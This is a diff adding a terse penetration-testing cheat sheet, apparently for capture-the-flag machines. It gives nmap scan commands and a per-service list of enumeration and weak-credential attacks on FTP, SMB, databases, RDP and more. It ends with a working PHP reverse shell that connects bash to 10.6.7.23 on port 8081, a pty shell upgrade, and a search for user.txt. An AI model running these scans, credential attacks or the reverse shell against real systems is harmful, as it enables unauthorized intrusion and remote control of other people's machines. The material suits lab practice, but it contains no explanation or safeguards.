@@ -1,0 +1,43 @@
+1. Run NMAP 
+    sudo nmap -sC -sV -p- -Pn --min-rate=10000 10.10.10.10
+    sudo nmap -sU -p- -Pn --min-rate=10000 10.10.10.10
+    sudo nmpa -sC -sV -p XX,XX,XXX 10.10.10.10
+
+2. choose attack surface from NMAP results
+    Attack   
+FTP (21) → Try anonymous login, grab files (ftp <ip> / curl ftp://<ip>/ --user anonymous:).
+SMB (139/445) → Enumerate shares (smbclient -L //<ip>/ -N, enum4linux).
+HTTP (80/443) → Fuzz dirs (gobuster dir -u http://<ip> -w wordlist).
+HTTPS → Check SSL/TLS misconfigs (sslscan <ip>).
+Web Apps → Check version & CVEs (searchsploit <app>).
+MySQL (3306) → Try weak creds (mysql -u root -h <ip> -p).
+MSSQL (1433) → Default creds / xp_cmdshell abuse.
+Postgres (5432) → Test postgres:postgres creds.
+RDP (3389) → Weak creds, BlueKeep (if old Win).
+SSH (22/2222) → Test creds from other services, key reuse.
+SMTP (25/465/587) → VRFY/EXPN for users (nc <ip> 25).
+IMAP/POP3 (143/110) → Try weak creds, dump mailboxes.
+SNMP (161/162) → Community string enum (snmpwalk -v2c -c public <ip>).
+NFS (2049) → Showmount exports (showmount -e <ip>).
+Telnet (23) → Banner grab + default creds.
+VNC (5900) → Try no password / weak auth.
+LDAP (389) → Anonymous bind (ldapsearch -x -h <ip> -b "").
+Redis (6379) → Unauth access (redis-cli -h <ip>).
+Elasticsearch (9200) → Query for data (curl <ip>:9200/_cat/indices).
+Exotic Ports → Always banner grab (nc -nv <ip> <port>).
+
+3. 
+
+<!-- shell -->
+
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/10.6.7.23/8081 0>&1'");
+?>
+
+
+<!-- upgrade shell --> 
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+find / -name 'user.txt' 2>/dev/null
